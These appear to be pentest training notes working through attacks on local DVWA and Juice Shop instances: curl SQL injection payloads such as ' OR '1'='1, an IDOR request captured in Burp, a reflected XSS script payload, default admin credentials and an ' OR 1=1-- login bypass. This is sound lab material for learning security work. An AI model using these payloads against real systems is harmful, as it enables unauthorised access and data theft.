# Vulnerabilities Attack Workflows

## DVWA → SQL Injection (Using Curl commands)

### Test with curl:

``` 
curl "http://localhost:8080/vulnerabilities/sqli/?id=1'&Submit=Submit" \
  -b "PHPSESSID=<your-session>;security=low"
``` 
### Classic payload to dump all users:

``` 
curl "http://localhost:8080/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit" \
  -b "PHPSESSID=<your-session>;security=low"
``` 


## Finding: IDOR in User Profile (Burp Suite)

## Request (captured via Burp)

###
    GET /vulnerabilities/idor/?id=2 HTTP/1.1
    Host: localhost:8080
    Cookie: PHPSESSID=abc123; security=low

## Response
     HTTP/1.1 200 OK
     [Returns data for user ID 2, not the logged-in user]

## Payload
     ?id=2  (changed from ?id=1)

## Root Cause
    User-supplied ID parameter is passed directly to the database query
    without verifying that the requesting user owns that resource.

## Business Impact (Meridian FinServe context)
    An attacker could enumerate all customer account records at Meridian,
    exposing names, balances, and transaction history of every client.

## DVWA → XSS (Reflected) (using curl)

    ### <script>alert('XSS-Kavach')</script>

``` 
curl "http://localhost:8080/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>" \
  -b "PHPSESSID=<your-session>;security=low"
``` 

## Authentication Failures → Use DVWA + Juice Shop

    DVWA — Weak credentials: (using curl)

``` 
curl -X POST http://localhost:8080/login.php \
  -d "username=admin&password=password&Login=Login"
``` 

## Juice Shop — Login bypass via SQLi in login form:

### 
    Email field: ' OR 1=1--
    Password: anything
    This bypasses authentication entirely


